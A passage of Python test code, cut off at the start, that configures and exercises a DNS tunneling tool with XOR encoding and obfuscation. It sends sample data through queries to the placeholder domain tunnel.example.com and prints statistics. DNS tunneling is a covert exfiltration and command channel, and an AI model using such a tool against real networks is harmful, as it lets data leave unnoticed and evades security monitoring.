        'encryption': 'xor',
        'chunk_size': 180,
        'use_obfuscation': True,
        'nameservers': ['8.8.8.8', '1.1.1.1']
    }
    
    # Server mode configuration  
    server_config = {
        'mode': 'server',
        'protocol': 'txt',
        'domain': 'tunnel.example.com',
        'compression': 'zlib',
        'encryption': 'xor',
        'use_obfuscation': True,
        'nameservers': ['8.8.8.8']
    }
    
    print("\n1. Testing client mode...")
    client_tunnel = get_dns_tunnel(client_config)
    
    test_results = client_tunnel.test_tunnel()
    print(f"Client mode tests:")
    print(f"  Mode: {test_results['mode']}")
    print(f"  Protocol: {test_results['protocol']}")
    
    for test_name, test_result in test_results['tests'].items():
        success = test_result.get('success', False)
        print(f"  {test_name}: {'✅' if success else '❌'} {test_result}")
    
    print("\n2. Testing data transmission...")
    
    test_data = b"This is a test of the DNS tunneling system. " * 10
    
    print(f"Sending {len(test_data)} bytes...")
    
    packet_id = client_tunnel.send_data(test_data)
    
    if packet_id:
        print(f"✅ Data sent successfully with packet ID: {packet_id}")
    else:
        print("❌ Failed to send data")
    
    print("\n3. Getting statistics...")
    stats = client_tunnel.get_statistics()
    
    print(f"📊 DNS Tunnel Statistics:")
    print(f"  Total packets: {stats['total_packets']}")
    print(f"  Total queries: {stats['total_queries']}")
    print(f"  Query success rate: {stats['query_success_rate']:.1f}%")
    print(f"  Total bytes sent: {stats['data_sent_mb']:.2f} MB")
    print(f"  Compression ratio: {stats['compression_ratio']:.2f}")
    print(f"  Uptime: {stats['uptime_human']}")
    
    print("\n✅ DNS Tunnel tests completed!")
